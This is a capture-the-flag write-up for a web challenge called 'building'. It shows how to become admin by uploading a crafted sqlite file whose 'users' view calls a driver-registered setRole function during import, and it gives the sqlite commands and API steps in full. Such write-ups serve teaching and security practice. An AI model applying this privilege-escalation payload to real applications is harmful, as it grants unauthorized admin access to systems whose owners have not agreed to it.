# building

Category: web

# Observations
  * target: `/admin` (an admin account is required to access it)
  * we can create users in our "room", but we can't create an admin - only an admin can create another admin
  * there is a pre-created admin account with `id=1`:
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
...

INSERT INTO users (username, password_hash, role_id, room_id, created_at, updated_at) VALUES
    ('admin', ...);
```
  * to become an admin there are two possibilities (but we still need to bypass admin-check):
    1. by uploading csv or sqlite files with user data
    2. by changing user role
  * there is a registered function `setRole` - strange, why was this added to the DB driver?
    Given the ability to upload sqlite file, we can try calling `setRole` as an admin.

# Solution
## Prepare users
1. We can download a csv file with `/sample_csv` and upload it again to quickly create users.
2. After this, we can check the target user ID: `/api/rooms/137/users`
```json
{"id":424,"username":"user_344b447754513d3d@137","card_id":509896843049,"role_id":3}
```

## Prepare sqlite file with `setRole`
We need this file just to trigger `setRole` to our user with `id=424`.

```shell
$ sqlite3 vuln.db
sqlite> CREATE VIEW users AS
  SELECT
    setRole(424, 1, 1) AS username,
    '123' AS card_id,
    'user' AS role,
    'pass' AS password;
sqlite> 

```

## Getting the flag
1. Upload `vuln.db` as user data file
2. Retrieve the flag from `/admin`
